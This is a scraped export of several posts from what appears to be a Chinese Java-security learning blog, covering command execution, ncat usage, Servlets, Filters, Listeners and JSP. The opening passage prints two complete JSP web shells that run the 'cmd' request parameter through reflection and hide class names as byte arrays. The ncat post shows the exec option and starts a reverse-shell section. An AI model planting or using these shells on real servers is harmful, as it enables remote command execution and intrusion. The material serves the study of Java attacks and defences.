import=\u0026#34;java.lang.reflect.Method\u0026#34; %\u0026gt; \u0026lt;%@page import=\u0026#34;java.util.Scanner\u0026#34;%\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Reflect Runtime.exec()\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;Reflect Runtime.exec()\u0026lt;/h2\u0026gt; \u0026lt;% String str = request.getParameter(\u0026#34;cmd\u0026#34;); // 反射 java.lang.Runtime Class对象 Class\u0026lt;?\u0026gt; c = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101})); // public getRuntime() 反射获取单例类的唯一对象的方法 Method m1 = c.getMethod(new String(new byte[]{103, 101, 116, 82, 117, 110, 116, 105, 109, 101})); // 反射exec方法 Method m2 = c.getMethod(new String(new byte[] {101, 120, 101, 99}), String.class); // 调用exec方法返回 // m2.invoke(Runtime对象，cmd命令) // m1 /* 调用exec方法返回 m2.invoke(Runtime对象，cmd命令) m1.invoke(null, new Object[]) getRuntime为static方法，故为null */ Object obj1 = m2.invoke(m1.invoke(null, new Object[]{}), (Object[]) new String[]{str}); // Object obj1 = m2.invoke(m1.invoke(null, new Object[]{}), new Object[]{str}); // 反射获取Process类的getInputStream方法 Method m3 = obj1.getClass().getMethod(new String(new byte[] {103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109}), null); m3.setAccessible(true); Scanner s = new Scanner((InputStream) m3.invoke(obj1, new Object[]{})).useDelimiter(\u0026#34;\\\\A\u0026#34;); String result = s.hasNext() ? s.next() : \u0026#34;\u0026#34;; out.print(result); %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 反射UNIXProces/ProcessImpl \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;%@page import=\u0026#34;java.lang.reflect.Constructor\u0026#34; %\u0026gt; \u0026lt;%@page import=\u0026#34;java.lang.reflect.Method\u0026#34; %\u0026gt; \u0026lt;%@page import=\u0026#34;java.util.Scanner\u0026#34; %\u0026gt; \u0026lt;%@ page import=\u0026#34;java.io.*\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;ReflectUNIXProcess\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h2\u0026gt;ReflectUNIXProcess\u0026lt;/h2\u0026gt; \u0026lt;%! byte[] toCString(String str) { if (str == null) { return null; } byte[] bytes = str.getBytes(); byte[] result = new byte[bytes.length + 1]; System.arraycopy(bytes, 0, result, 0, bytes.length); result[result.length - 1] = (byte) 0; return result; } %\u0026gt; \u0026lt;%! InputStream start(String[] cmds) throws Exception { Class clazz = null; try { // 反射类对象 java.lang.UNIXProcess, jdk9以前 clazz = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 85, 78, 73, 88, 80, 114, 111, 99, 101, 115, 115})); } catch (ClassNotFoundException e) { // 反射类对象 java.lang.ProcessImpl， jdk9+ clazz = Class.forName(new String(new byte[]{106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 80, 114, 111, 99, 101, 115, 115, 73, 109, 112, 108})); ; } // 反射default 构造器 Constructor\u0026lt;?\u0026gt; constructor = clazz.getDeclaredConstructors()[0]; constructor.setAccessible(true); assert cmds != null \u0026amp;\u0026amp; cmds.length \u0026gt; 0; byte[][] args = new byte[cmds.length - 1][]; int size = args.length; for (int i = 0; i \u0026lt; args.length; i++) { args[i] = cmds[i + 1].getBytes(); size += args[i].length; } byte[] argBlock = new byte[size]; int i = 0; for (byte[] arg : args) { System.arraycopy(arg, 0, argBlock, i, arg.length); i += arg.length + 1; } int[] envc = new int[1]; int[] std_fds = new int[]{-1, -1, -1}; FileInputStream f0 = null; FileOutputStream f1 = null; FileOutputStream f2 = null; try { if (f0 != null) f0.close(); } finally { try { if (f1 != null) f1.close(); } finally { if (f2 != null) f2.close(); } } Object obj = constructor.newInstance(toCString(cmds[0]), argBlock, args.length, null, envc[0], null, std_fds, false); Method inMethod = obj.getClass().getDeclaredMethod(new String(new byte[]{103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109})); inMethod.setAccessible(true); return (InputStream) inMethod.invoke(obj); } String inputStreamToString(InputStream in, String charset) throws IOException { try { if (charset == null) { charset = \u0026#34;UTF-8\u0026#34;; } ByteArrayOutputStream out = new ByteArrayOutputStream(); int a = 0; byte[] b = new byte[1024]; while ((a = in.read(b)) != -1) { out.write(b, 0, a); } return new String(out.toByteArray()); } catch (IOException e) { throw e; } finally { if (in != null) in.close(); } } %\u0026gt; \u0026lt;% String[] str = request.getParameterValues(\u0026#34;cmd\u0026#34;); if (str != null) { InputStream in = start(str); String result = inputStreamToString(in, \u0026#34;UTF-8\u0026#34;); out.println(\u0026#34;\u0026lt;pre\u0026gt;\u0026#34;); out.println(result); out.println(\u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;); out.flush(); out.close(); } %\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 防御 添加钩子函数监测命令执行（RASP） 监测输入命令，过滤非法命令 Reference 『Java安全』shell命令执行的几种方式与Runtime.exec()本地命令执行漏洞调用分析 Java本地命令执行 ","date":"2022-09-23T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/javasec_runtimecommandexecution/","title":"Java本地命令执行"},{"content":"Ncat/nc 学习（未完待续） 本篇主要记录ncat/nc工具的学习使用，接下来具体的使用以ncat命令为主，主要是是考虑到nc在各个操作系统存在多个版本，造成很多参数都不能同步使用。 Ncat是由Nmap下的一个新的项目，因此可以直接代替使用。 本文主要参考官方文档以及国光师傅的文章：nc 命令教程 基础使用 参考官网使用手册：Basic usage ncat的使用主要分为两种模式：connect mode连接模式以及listen mode监听模式 Connect mode 连接模式 ncat \u0026lt;host\u0026gt; [\u0026lt;port\u0026gt;] ncat会向一个正在监听的服务发起一个连接 类似于socket网络编程中的 connect 方法，而发起者可以看作是client客户端 Listen mode 监听模式 ncat \u0026ndash;listen [\u0026lt;host\u0026gt;] [\u0026lt;port\u0026gt;] ncat -l [\u0026lt;host\u0026gt;] [\u0026lt;port\u0026gt;] ncat会启动服务并等待连接 类似于socket网络编程中的bind和listen方法，监听端可以看作是server服务端 默认的host为任何本地接口（INADDR_ANY） 默认的port为31337 默认只有root用户才能监听低于1024（服务端口）的端口号 默认使用TCP连接，且只接收一个连接，并且在客户端退出之后断开连接 可以使用 -k, --keep-open 选项来允许多个连接并保持 实验环境 操作系统 IP地址 定位 macOS 12.4 192.168.0.100 服务端监听 kali 5.18.0-kali5-arm64 172.16.232.135 客户端连接 文字交互 -l, --listen listen mode, for inbound connects 我们使用macOS来监听本地2333端口的入站连接 ncat -l 2333 在kali端进行连接，之后就可以进行通信了 ncat 192.168.0.100 2333 Figure 1: 基础文字交互\n任意一方按下 Ctrl+C 结束连接之后，双方都会断开 当macOS服务端加上 -k, --keep-open 选项之后，kali客户端断开连接后，macOS服务端仍然监听，方便多个客户端在之后连入 命令交互 -e, --exec \u0026lt;command\u0026gt; Executes the given command --lua-exec \u0026lt;filename\u0026gt; Executes the given Lua script -v, --verbose Set verbosity level (can be used several times) macOS服务端监听本地2333端口的入站连接，并将收到的信息发送的/bin/zsh ncat 192.168.0.100 2333 Figure 2: 命令交互\n内网弹shell 因为没有现成的服务器，考虑时间成本问题，待更新 ","date":"2022-09-23T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/learn_ncat/","title":"Ncat/nc 学习（未完待续）"},{"content":"JavaSec - Java Web - 三大核心组件 - Listener \u0026amp; Filter 本篇主要介绍Java Web的其他两大核心组件，Listener和Filter，建议先阅读Servlet篇，对于Java Web的底层组件有一个基础的了解之后，再来进行阅读会更为方便 Filter 过滤器 Filter的主要功能是： 拦截请求 权限检查 日记操作 事务管理 \u0026hellip; 过滤响应 Filter过滤器的使用步骤 编写一个类实现Filter接口（IDEA可以自动生成） 重写实现 doFilter() 方法（进行过滤） web.xml或者注解中配置拦截路径 Filter的生命周期 构造器方法 init初始化方法 第1，2步，在web工程启动的时候执行（Filter已经创建） doFilter过滤方法 每次拦截到请求，就会执行过滤 destory销毁方法 停止web工程时，销毁Filter过滤器 FilterConfig类 Tomcat每次创建Filter的时候，也会同时创建一个FilterConfig类，其中包含了Filter配置文件的配置信息，其中包含： 获取Filter的名称 filter-name的内容 获取再Filter中配置的init-param初始化参数 获取ServletContext对象 FilterChain 过滤链类 FilterChain顾名思义就是将多个Filter联合使用，形成过滤链 Figure 1: Filter链执行顺序\nFilter的拦截路径 精确匹配 \u0026lt;url-pattern\u0026gt;/target.jsp\u0026lt;url-pattern\u0026gt; 对http://ip:port/%E5%B7%A5%E7%A8%8B%E8%B7%AF%E5%BE%84/target.jsp 单个资源有效 目录匹配 \u0026lt;url-pattern\u0026gt;/admin/*\u0026lt;url-pattern\u0026gt; 对所有admin目录下的资源访问进行拦截过滤 后缀名匹配 \u0026lt;url-pattern\u0026gt;*.html\u0026lt;url-pattern\u0026gt; 对所有的html文件进行拦截过滤 Filter过滤器只关心请求的地址是否匹配，不关心请求的资源是否存在！ Listener 监听器 本节内容绝大部分搬运自: Servlet Listener（监听器） \u0026ldquo;Servlet 规范中定义了 8 个监听器接口，可以用于监听 ServletContext、HttpSession 和 ServletRequest 对象的生命周期和属性变化事件。开发 Servlet 监听器需要实现相应的监听器接口并重写接口中的方法。\u0026rdquo; 根据Listener所监听的事件，可以分为3类 监听对象 创建和销毁 的监听器 监听对象中 属性变更 的监听器 监听 HttpSession 中的对象状态改变的监听器 监听对象创建和销毁的监听器 “Servlet 规范定义了监听 ServletContext、HttpSession、HttpServletRequest 这三个对象创建和销毁事件的监听器，如下表所示：” Figure 2: 监听对象创建和销毁的监听器\n监听属性变更的监听器 “Servlet 规范定义了监听 ServletContext、HttpSession、HttpServletRequest 这三个对象中的属性变更事件的监听器，这三个监听器接口分别是 ServletContextAttributeListener、HttpSessionAttributeListener 和 ServletRequestAttributeListener。这三个接口中都定义了三个方法，用来处理被监听对象中属性的增加，删除和替换事件。同一种事件在这三个接口中对应的方法名称完全相同，只是参数类型不同，如下表所示:” Figure 3: 监听属性变更的监听器\n监听 Session 中对象状态改变的监听器 “Session 中的对象可以有多种状态：绑定到 Session 中、从 Session 中解除绑定、随 Session 对象持久化到存储设备中(钝化)、随 Session 对象从存储设备中恢复（活化）。” “Servlet 规范中定义了两个特殊的监听器接口，用来帮助对象了解自己在 Session 中的状态：HttpSessionBindingListener 接口和 HttpSessionActivationListener 接口 ，实现这两个接口的类不需要进行注册。” Figure 4: 监听 Session 中对象状态改变的监听器\n监听器的注册 注册 Servlet 监听器有 2 种方式，分别是： 在 web.xml 中注册监听器； 使用 @WebListener 注册监听器。 在 web.xml 中注册监听器 在 web.xml 中使用 \u0026lt;listener\u0026gt; 标签配置监听器，Web 容器会自动把监听器注册到事件源中，示例代码如下。 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\u0026#34; version=\u0026#34;4.0\u0026#34;\u0026gt; \u0026lt;listener\u0026gt; \u0026lt;listener-class\u0026gt;net.biancheng.www.listener.MySessionListener\u0026lt;/listener-class\u0026gt; \u0026lt;/listener\u0026gt; \u0026lt;/web-app\u0026gt; 使用 @WebListener 注解注册监听器 在监听器类上使用 @WebListener 注解，可以将该 Java 类注册为一个监听器类。示例代码如下。 package net.biancheng.www.servlet; import javax.servlet.ServletContextEvent; import javax.servlet.ServletContextListener; import javax.servlet.annotation.WebListener; /** * 监听器实例代码 * * @author 编程帮 www.biancheng.net */ @WebListener public class MyListener implements ServletContextListener { public MyListener() { } public void contextDestroyed(ServletContextEvent sce) { } public void contextInitialized(ServletContextEvent sce) { } } 三个组件的调用顺序 三者的加载顺序为Listener-\u0026gt;Filter-\u0026gt;Servlet 在org.apache.catalina.core.StandardContext类的 startInternal() 方法中， 依次调用了listenerStart(), filterStart()，最后是loadOnStartup(); 这三处调用触发了Listener、Filter、Servlet的构造加载。 protected synchronized void startInternal() throws LifecycleException { ... ... try { ... ... // 1. ListenerStart() if (ok \u0026amp;\u0026amp; !this.listenerStart()) { log.error(sm.getString(\u0026#34;standardContext.listenerFail\u0026#34;)); ok = false; } // 2. filterStart() if (ok \u0026amp;\u0026amp; !this.filterStart()) { log.error(sm.getString(\u0026#34;standardContext.filterFail\u0026#34;)); ok = false; } // 3. loadOnStartup() if (ok \u0026amp;\u0026amp; !this.loadOnStartup(this.findChildren())) { log.error(sm.getString(\u0026#34;standardContext.servletFail\u0026#34;)); ok = false; } super.threadStart(); ... ... } Reference 【尚硅谷最新版JavaWeb全套教程,java web零基础入门完整版】 Servlet Listener（监听器） Java安全学习——Tomcat架构浅析 ","date":"2022-09-20T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/javasec_javaweb_listener_and_filter/","title":"JavaSec - Java Web - 三大核心组件 - Listener \u0026 Filter"},{"content":"JavaSec - JavaWeb - JSP基础 在JavaWeb的Servlet篇，我们介绍了Servlet是如何作为一个中间件来帮助Tomcat服务器处理来自用户客户端请求的。 当我们最后讲到服务器返回资源时提到了在两种输出流（字节流/字符流）选择一种后，再直接输出内容。但是如果需要返回完整的一个页面，就需要将HTML的内容逐行返回，这就会使整个过程变得非常繁琐，同时极大地增加了开发成本和维护成本。 JSP, Java Server Pages，我们在这篇blog中要介绍的，就是JSP如何代替Servlet更为高效的回传HTML页面的数据 因为脚本语言的学习较为基础，没有特别多逻辑性的需要理解的地方，因此本篇主要作为学习笔记。 JSP是一个Servlet程序 当JSP文件被客户端访问时，JSP就会被翻译成为.java文件再被编译成.class文件来使用 那我们访问翻译之后的.java源码可以发现，翻译之后的类继承了org.apache.jasper.runtime.HttpJspBase这个类继承了HttpServlet，因此我们可以说JSP就是一个Servlet程序 Figure 1: JSP是一个Servlet程序\n同时我们可以看到源码当中就像我们之前说的那样逐行的打印了HTML源码 try { response.setContentType(\u0026#34;text/html;charset=UTF-8\u0026#34;); pageContext = _jspxFactory.getPageContext(this, request, response, null, true, 8192, true); _jspx_page_context = pageContext; application = pageContext.getServletContext(); config = pageContext.getServletConfig(); session = pageContext.getSession(); out = pageContext.getOut(); _jspx_out = out; out.write(\u0026#34;\\n\u0026#34;); out.write(\u0026#34;\\n\u0026#34;); out.write(\u0026#34;\u0026lt;html\u0026gt;\\n\u0026#34;); out.write(\u0026#34;\u0026lt;head\u0026gt;\\n\u0026#34;); out.write(\u0026#34; \u0026lt;title\u0026gt;Hello JSP\u0026lt;/title\u0026gt;\\n\u0026#34;); out.write(\u0026#34;\u0026lt;/head\u0026gt;\\n\u0026#34;); out.write(\u0026#34;\u0026lt;body\u0026gt;\\n\u0026#34;); out.write(\u0026#34; Hi, I am learning JSP!\\n\u0026#34;); out.write(\u0026#34;\u0026lt;/body\u0026gt;\\n\u0026#34;); out.write(\u0026#34;\u0026lt;/html\u0026gt;\\n\u0026#34;); } JSP指令 接下来我们看看实际的JSP代码，我个人感觉其实和PHP是一个道理，就是前后端不分离，HTML以及处理的脚本语言都放在一起，同时脚本语言会通过特殊的格式单独拎出来方便翻译 page指令 \u0026lt;%@ page contentType=\u0026#34;text/html;charset=UTF-8\u0026#34; language=\u0026#34;java\u0026#34; %\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Hello JSP\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Hi, I am learning JSP! \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;%@ page ... %\u0026gt; 就是我们第一个要了解的JSP脚本语句，主要用来修改JSP页面中的一些重要的属性，或者行为，从而影响之后翻译的.java以及.class文件 属性 Description language 表示jsp翻译之后是什么语言。暂时只支持java contentType 表示服务器响应中的数据类型是什么（response.setContentType()） pageEncoding 表示当前jsp页面文件本身的字符集 import 需要导入的package（和java源码中一样） errorPage 设置当jsp页面运行出错时，自动跳转去的错误页面路径（一般以斜杠打头，http://ip:port/%E5%B7%A5%E7%A8%8B%E8%B7%AF%E5%BE%84） isErrorPage 设置当前jsp页面是否为错误信息页面（默认为false）。如果是true的话会额外开辟一个存储异常信息的对象 session 设置访问当前jsp页面，是否会创建HttpSession对象（默认为true） extends属性 设置jsp翻译出来的java类默认继承类（默认为HttpServlet） out输出流属性： 如果没有正确设置会出现 BufferOverflow的错误 autoFlush 设置为 out 输出流缓冲区满了之后，是否自动刷新缓冲区（默认为true） buffer属性 设置 out 缓冲区的大小（默认为8kb） include指令 这里的include和PHP中的include比较像，主要是通过include包含指令来组合页面，避免复写一些公共网页模块（比如导航栏，页脚） \u0026lt;%@ include ... %\u0026gt; 包含其他文件（静态包含） 静态包含\nfile属性置顶需要包含的jsp页面的路径，一般以/斜杠打头（表示http://ip:port/%E5%B7%A5%E7%A8%8B%E8%B7%AF%E5%BE%84） 映射到工程的web目录下 \u0026lt;%@ include file=\u0026#34;\u0026#34; %\u0026gt; 包含其他文件（静态包含） 静态包含的特点： 静态包含不会将包含的jsp页面翻译翻译成为.java文件 而是直接把被包含的jsp页面的代码转换成为html内容直接拷贝到包含的位置执行输出（out.write()） 动态包含\npage属性是指定要包含的jsp的页面路径 \u0026lt;jsp:include page=\u0026#34;\u0026#34; %\u0026gt;\u0026lt;/jsp:include\u0026gt; Figure 2: JSP动态包含\n动态包含的特点： 动态包含会将包含的jsp页面主动翻译成为.java文件 在本jsp被翻译的.java文件中使用JspRuntimeLibrary.include(request, response, \u0026ldquo;/include/footer.jsp\u0026rdquo;, out, false)的形式来动态包含jsp文件 动态包含还可以传递参数 \u0026lt;jsp:include page=\u0026#34;/index.jsp\u0026#34;\u0026gt; \u0026lt;jsp:param name=\u0026#34;username\u0026#34; value=\u0026#34;admin\u0026#34;/\u0026gt; \u0026lt;jsp:param name=\u0026#34;password\u0026#34; value=\u0026#34;root\u0026#34;/\u0026gt; \u0026lt;/jsp:include\u0026gt; 一般使用静态包含 taglib指令 \u0026lt;%@ taglib prefix=\u0026#34;c\u0026#34; uri=\u0026#34;http://java.sun.com/jsp/jstl/core\u0026#34; %\u0026gt; 引入标签库的定义 JSP常用脚本 JSP 声明脚本 格式为： \u0026lt;%! 声明 java 代码 %\u0026gt; 主要用来对一下内容进行声明： 声明类属性 声明static静态代码块 声明方法 声明内部类 Figure 3: JSP文件中的脚本声明以及翻译之后的java代码\n表达式脚本 格式为：\u0026lt;%= 表达式%\u0026gt; 表达式脚本是用来在JSP页面上来输出以下数据数据 整形 浮点型 字符串 对象 使用的特点： 所有的表达式脚本都会被翻译到 _jspService() 方法中 因此_jspService()方法中的对象都可以直接使用 表达式脚本都会被翻译成out.print()输出到页面上 表达式脚本中的表达式不能以 ; 结尾 代码脚本 格式：\u0026lt;% java语句 %\u0026gt; 作用：可以在jsp页面中，编写我们自己需要的功能（写的是java语句） if语句 for循环语句 翻译后java文件中 _jspService 方法内的代码都可以写 特点： 代码脚本翻译之后的崽 _jspService() 方法中 因此 jspService() 方法中的对象都可以直接使用 还可以由多个代码脚本块组成完成一个完整的java语句 代码脚本还可以和表达式脚本一起组合使用，在jsp页面上输出内容 \u0026lt;table border=\u0026#34;1\u0026#34; cellspacing=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;% for (int i = 0; i \u0026lt; 5; i++) { %\u0026gt; \u0026lt;tr\u0026gt; \u0026lt;td\u0026gt;第\u0026lt;%= i%\u0026gt;行\u0026lt;/td\u0026gt; \u0026lt;/tr\u0026gt; \u0026lt;% } %\u0026gt;\u0026lt;/table\u0026gt; JSP中的三种注释 html 注释 \u0026lt;!-- html 注释 --\u0026gt; html注释会被翻译到java源代码中。在_jspService方法里，以out.writer输出到客户端（还是作为html注释） java注释 // 单行java注释 /* 多行java注释 */ java注释会被翻译到java源代码中还是作为java注释 jsp注释 \u0026lt;%-- jsp注释 --%\u0026gt; jsp注释可以真正注释掉任意代码 JSP中的九大内置对象 jsp中的内置对象，指的是Tomcat在翻译jsp页面成为Servlet源代码后，内部提供的九大对象 final jakarta.servlet.jsp.PageContext pageContext; jakarta.servlet.http.HttpSession session = null; java.lang.Throwable exception = org.apache.jasper.runtime.JspRuntimeLibrary.getThrowable(request); final jakarta.servlet.ServletContext application; final jakarta.servlet.ServletConfig config; jakarta.servlet.jsp.JspWriter out = null; final java.lang.Object page = this; jakarta.servlet.jsp.JspWriter _jspx_out = null; jakarta.servlet.jsp.PageContext _jspx_page_context = null; 内置对象 描述 request 请求对象 response 响应对象 pageContext jsp的上下文对象 session 会话对象 application ServletContext对象 config ServletConfig对象 out jsp输出流对象 page 指向当前jsp的对象 exception 异常对象（只有当page指令表示当前页面为错误信息页面时才会生成） JSP四大域对象\n域对象 类 描述 pageContext PageContextImpl 当前jsp页面范围内有效（换一个jsp页面就无法访问） request HttpServletRequest 一次请求内有效（发出一个新的请求就无法访问） session HttpSession 一个会话范围内有效（打开浏览器访问服务器，直到关闭浏览器）（关闭浏览器窗口之后就会失效） application ServletContext 整个web工程范围内都有效（只要web工程不停止，数据都还在，可以参考我们在Servlet中介绍的ServletContext）（重新部署工程后就会失效） 域对象是可以像Map一样可以存储数据的对象。 四个域对象功能一样，但是他们对数据的存取以及有效范围（时间，空间）不同 四个域对象在使用时的优先顺序是按照他们的从小到大的作用范围所排序的，主要的原因是为了优化内存：因为作用范围小的对象在不用是就可以提早释放，减轻内存负担，而范围大的对象就需要存储很多地方都要用到的数据。 pageContext \u0026gt; request \u0026gt; session \u0026gt; application out与response的区别\nFigure 4: out\u0026amp;response输出的区别\n由于jsp翻译之后，底层源代码都是使用out来进行输出，所以一般情况下我们也是用out来进行输出，避免打乱页面输出内容的顺序。 同时对于out中的两种输出方法： out.write() 输出字符串没有问题（整型就有问题了） out.print() 输出任意数据都没有问题（都转换成为字符串后调用的write输出） 因此我们一般都用 out.print() 来进行输出 JSP的常用标签 JSP请求转发 JSP简化了Servlet的请求转发两步走的流程（先获取Dispatcher再forward），而是直接使用 jsp:forward 标签来进行转发 \u0026lt;jsp:forward page=\u0026#34;/index.jsp\u0026#34;\u0026gt;\u0026lt;/jsp:forward\u0026gt; EL 表达式 Reference 【尚硅谷最新版JavaWeb全套教程,java web零基础入门完整版】 ","date":"2022-09-20T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/javasec_javaweb_jsp/","title":"JavaSec - JavaWeb - JSP基础"},{"content":"JavaSec - Java Web - 三大核心组件 - Servlet 本篇作为JavaSec的基础内容学习中，Java web中的三大核心组件介绍的第一篇Servlet，主要分享学习Servlet在Java web工程中的所承担的职责，以及开始了解Java web工程，以便之后更好的了解漏洞所处的工程环境 Figure 1: Servlet Summary\n什么是Servlet \u0026ldquo;A servlet is a small Java program that runs within a Web server. Servlets receive and respond to requests from Web clients, usually across HTTP, the HyperText Transfer Protocol.\u0026rdquo; \u0026ndash; Java EE API 根据Java EE的文档说明，Servlet是运行在Web服务器上的一个Java程序，主要负责接收和处理从Web客户端（浏览器）发出的请求（POST \u0026amp; GET）,一般通过HTTP。 我们知道在PHP当中，当用户填写表达并提交，一般就会将相应的请求发送到服务端对应的php脚本上，然后php脚本会根据 $_GET 以及 $_POST 数组（以及其他请求）来获取请求的内容并进行处理。 Servlet就是Java中用来处理来自客户端的GET以及POST请求（以及其他请求）的一个程序。 Servlet的生命周期 \u0026ldquo;This interface defines methods to initialize a servlet, to service requests, and to remove a servlet from the server. These are known as life-cycle methods and are called in the following sequence: The servlet is constructed, then initialized with the init method. Any calls from clients to the service method are handled. The servlet is taken out of service, then destroyed with the destroy method, then garbage collected and finalized.\u0026rdquo; 既然我们之前说Servlet作为一个程序，那么它就一定有一个生命周期，那么根据文档，Servlet程序的生命周期如下： 加载，当Tomcat第一次访问Servlet资源时，执行 Servlet 构造器方法，创建Servlet实例 初始化：执行 init() 初始化方法 当Servlet程序第一次收到客户端请求时，会依次执行构造器方法和 init() 方法 之后就不用再次执行 执行 service() 方法 每次收到来自客户端的请求时都会执行 执行 destroy() 销毁方法 当 web 工程停止的时候时执行，释放内存 如何使用Servlet \u0026ldquo;To implement this interface, you can write a generic servlet that extends javax.servlet.GenericServlet or an HTTP servlet that extends javax.servlet.http.HttpServlet.\u0026rdquo; 接着我们就要知道，具体要如何实现并使用Servlet来帮助web程序来处理来自客户端的请求呢？ 一般来说，我们都是通过直接继承 HttpServlet 这个类，并且重写 doGet() 以及 doPost() 这两个方法来实现对于不同请求的处理 Figure 2: Servlet的继承关系\n记得我们之前说过service()方法是用来处理客户端的各种请求的，下面的代码就很好的说明了 service() 方法是如何区分各种请求，并且与对应的 doGet(), doPost() 等方法配合的。 public void service(ServletRequest req, ServletResponse res) throws ServletException, IOException { if (req instanceof HttpServletRequest \u0026amp;\u0026amp; res instanceof HttpServletResponse) { HttpServletRequest request = (HttpServletRequest)req; HttpServletResponse response = (HttpServletResponse)res; this.service(request, response); } else { throw new ServletException(\u0026#34;non-HTTP request or response\u0026#34;); } } protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { String method = req.getMethod(); long lastModified; if (method.equals(\u0026#34;GET\u0026#34;)) { lastModified = this.getLastModified(req); if (lastModified == -1L) { this.doGet(req, resp); } else { long ifModifiedSince = req.getDateHeader(\u0026#34;If-Modified-Since\u0026#34;); if (ifModifiedSince \u0026lt; lastModified) { this.maybeSetLastModified(resp, lastModified); this.doGet(req, resp); } else { resp.setStatus(304); } } } else if (method.equals(\u0026#34;HEAD\u0026#34;)) { lastModified = this.getLastModified(req); this.maybeSetLastModified(resp, lastModified); this.doHead(req, resp); } else if (method.equals(\u0026#34;POST\u0026#34;)) { this.doPost(req, resp); } else if (method.equals(\u0026#34;PUT\u0026#34;)) { this.doPut(req, resp); } else if (method.equals(\u0026#34;DELETE\u0026#34;)) { this.doDelete(req, resp); } else if (method.equals(\u0026#34;OPTIONS\u0026#34;)) { this.doOptions(req, resp); } else if (method.equals(\u0026#34;TRACE\u0026#34;)) { this.doTrace(req, resp); } else { String errMsg = lStrings.getString(\u0026#34;http.method_not_implemented\u0026#34;); Object[] errArgs = new Object[]{method}; errMsg = MessageFormat.format(errMsg, errArgs); resp.sendError(501, errMsg); } } ServletConfig 配置 In addition to the life-cycle methods, this interface provides the getServletConfig method, which the servlet can use to get any startup information, and the getServletInfo method, which allows the servlet to return basic information about itself, such as author, version, and copyright. Servlet程序有两种配置形式，一种是使用在项目目录下 WEB-INF 下的 web.xml 文件中使用 \u0026lt;servlet\u0026gt; 系列标签进行配置，另一种是使用注解方式来进行配置（Servelet 3.0之后，Tomcat7+） web.xml配置 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;web-app xmlns=\u0026#34;https://jakarta.ee/xml/ns/jakartaee\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;https://jakarta.ee/xml/ns/jakartaee https://jakarta.ee/xml/ns/jakartaee/web-app_5_0.xsd\u0026#34; version=\u0026#34;5.0\u0026#34;\u0026gt; \u0026lt;servlet\u0026gt; \u0026lt;servlet-name\u0026gt;HelloServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;servlet-class\u0026gt;com.example.jsplearn.HelloServlet\u0026lt;/servlet-class\u0026gt; \u0026lt;init-param\u0026gt; \u0026lt;param-name\u0026gt;username\u0026lt;/param-name\u0026gt; \u0026lt;param-value\u0026gt;root\u0026lt;/param-value\u0026gt; \u0026lt;/init-param\u0026gt; \u0026lt;/servlet\u0026gt; \u0026lt;servlet-mapping\u0026gt; \u0026lt;servlet-name\u0026gt;HelloServlet\u0026lt;/servlet-name\u0026gt; \u0026lt;url-pattern\u0026gt;/hello\u0026lt;/url-pattern\u0026gt; \u0026lt;/servlet-mapping\u0026gt; \u0026lt;/web-app\u0026gt; 注解配置 @WebServlet(name = \u0026#34;helloServlet\u0026#34;, value = \u0026#34;/hello-servlet\u0026#34;) public class HelloServlet extends HttpServlet { private String message; public void init() { message = \u0026#34;Hello World!\u0026#34;; } ...... 可以配置的信息包括启用的Servlet程序所对应的类以及访问的url路径（servlet-name, servlet-class, servlet-mapping, url-paatern）,还可以配置一个Servlet在初始化时所初始化的一些变量（init-param）。 回顾一下之前的Servlet继承关系，我们说GenericServlet已经开始定义配置信息了，是因为它实现了 ServletCofnig 接口，因此servlet对象可以通过以下的get方法来获取配置信息，同时还可以同通过 getServletconfig() 方法来返回一个 ServletConfig 对象 Figure 3: ServletConfig 接口\n这里值得一提的是，ServletConfig对象是在一个Servlet程序启动时，在 init() 方法中被创建并保存的，因此如果在重写Servlet类的init()方法时，如果缺失了这一块，就会导致错误。 同时，getSevletConfig只能获取得到当前Servlet对象的ServletConfig对象，不同的Servlet类之间是不相同的 ServletConfig类的三大作用 获取Servlet程序的别名 servlet-name （web.xml配置中的值） 获取初始化参数 init-param 获取ServletContext对象 ServletContext 什么是ServletContext？ ServletContext是一个接口，表示Servlet上下文对象； 一个web工程，只有一个ServletContext对象实例，在所有的Servlet类中都可以获取到该唯一实例中的所有数据； 